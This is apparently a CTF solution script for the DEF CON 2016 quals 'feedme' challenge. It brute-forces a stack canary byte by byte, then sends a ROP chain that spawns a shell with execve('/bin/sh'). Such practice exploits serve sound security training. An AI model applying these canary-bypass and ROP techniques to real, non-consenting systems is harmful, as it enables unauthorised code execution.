'''
source 1: https://guyinatuxedo.github.io/07-bof_static/dcquals16_feedme/index.html
source 2: https://infosecwriteups.com/defcon-2016-quals-writeup-feedme-4d90167b448d
'''

from pwn import *

target = process("./feedme")

# first let's find the canary on stack by brute forcing byte-by-byte until the matching canary is found. Remember, forked child processes all have the same location of the canary as the parent process, and the same canary value itself on the stack at that location, meaning nothing changes once program forks, the whole memory is copied over to the child process
def find_canary():
    canary = '\x00'
    hex_canary = "00"
    input_size = 0x22
    for i in range(3):
        for ch in range(0, 0xff):
            target.send(chr(input_size))
            payload = "0" * 0x20 + canary + chr(ch)
            target.send(payload)
            res = target.recvuntil("exit.")
            if b"YUM" in res:
                canary += chr(ch)
                new_canary = hex(ch)
                new_canary = new_canary.replace("0x", "")
                new_canary = "{:02x}".format(int(new_canary, 16))
                hex_canary = new_canary + hex_canary
                input_size += 1
                print("Current canary: {}".format(hex_canary))
                break
    return canary, hex_canary

log.info("Finding canary...")
canary,hex_canary = find_canary()
print("Canary: " + canary)
print("Canary in hexadecimal is: 0x" + hex_canary)

POP_EAX_RET = 0x80bb496
POP_EDX_RET = 0x806f34a
MOV_TO_EAX = 0x807be31
BIN_SH = 0x80e9bbb          # some location probably in .BSS section where we can write
POP_ECX_POP_EBX_RET = 0x806f371
INT_0x80 = 0x8049761

# payload = b""
# payload = '0' * 32 + canary + '0' * 12
payload = p32(POP_EAX_RET)
payload += p32(BIN_SH)
payload += p32(POP_EDX_RET)
payload += p32(0x6e69622f)
payload += p32(MOV_TO_EAX)

payload += p32(POP_EAX_RET)
payload += p32(BIN_SH + 0x4)
payload += p32(POP_EDX_RET)
payload += p32(0x0068732f)
payload += p32(MOV_TO_EAX)

payload += p32(POP_EAX_RET)
payload += p32(0xb)
payload += p32(POP_ECX_POP_EBX_RET)
payload += p32(0x0)
payload += p32(BIN_SH)
payload += p32(POP_EDX_RET)
payload += p32(0x0)
payload += p32(INT_0x80)

chain = b'0' * 32 + p32(int(hex_canary.encode(), 16)) + b'0' * 12
chain += payload

target.send(chr(len(chain)))
target.send(chain)
target.interactive()
